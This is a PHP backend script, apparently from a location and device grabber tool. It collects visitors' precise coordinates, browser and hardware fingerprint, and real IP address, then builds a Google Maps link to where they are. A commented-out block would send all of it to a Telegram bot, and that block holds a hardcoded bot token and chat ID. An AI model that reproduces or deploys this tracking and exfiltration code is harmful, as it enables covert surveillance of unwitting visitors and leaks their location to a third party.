<?php
header('Content-Type: text/html');
$lat = $_POST['Lat'];
$lon = $_POST['Lon'];
$ptf = $_POST['Ptf'];
$brw = $_POST['Brw'];
$cc = $_POST['Cc'];
$ram = $_POST['Ram'];
$ven = $_POST['Ven'];
$ren = $_POST['Ren'];
$ht = $_POST['Ht'];
$wd = $_POST['Wd'];
$os = $_POST['Os'];

function getUserIP()
{
        // Get real visitor IP
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"]))
        {
        $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];

        if(filter_var($client, FILTER_VALIDATE_IP))
        {
        $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
        $ip = $forward;
        }
        else
        {
        $ip = $remote;
        }
        return $ip;
}

$ip = getUserIP();  
session_start();
$_SESSION['ss'] = $lat;
$alls =   "'lat' => $lat,
'Lon' => $lon,
'platform' => $ptf,
'browser' => $brw,
'cores' => $cc,
'ram' => $ram,
'vendor' => $ven,
'render' => $ren,
'ip' => $ip,
'ht' => $ht,
'wd' => $wd,
'os' => $os
'maps' => https://www.google.com/maps/place/$lat+$lon";
$_SESSION['kkk'] = $alls;
// $apiToken = "5292505510:AAHETtj4RDgXGwYzqQOi7EikQH8a7mvBml0";
// $dataa = [
//     'chat_id' => '670531769',
//     'text' => $alls,
// ];
// $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
//                                http_build_query($dataa) );





                               
    
$data = array(
  'lat' => $lat,
  'Lon' => $lon,
  'platform' => $ptf,
  'browser' => $brw,
  'cores' => $cc,
  'ram' => $ram,
  'vendor' => $ven,
  'render' => $ren,
  'ip' => $ip,
  'ht' => $ht,
  'wd' => $wd,
  'os' => $os
);
$json_data = json_encode($data);
echo($json_data);
$oldMessage = "";
$deletedFormat = "";

function fileReplaceContent($path, $oldContent, $newContent)
{
    $str = file_get_contents($path);
    $str = str_replace($oldContent, $newContent, $str);
    file_put_contents($path, $str);
}
fileReplaceContent('infotle.php','$gg$', 'new stringsg')
 ?>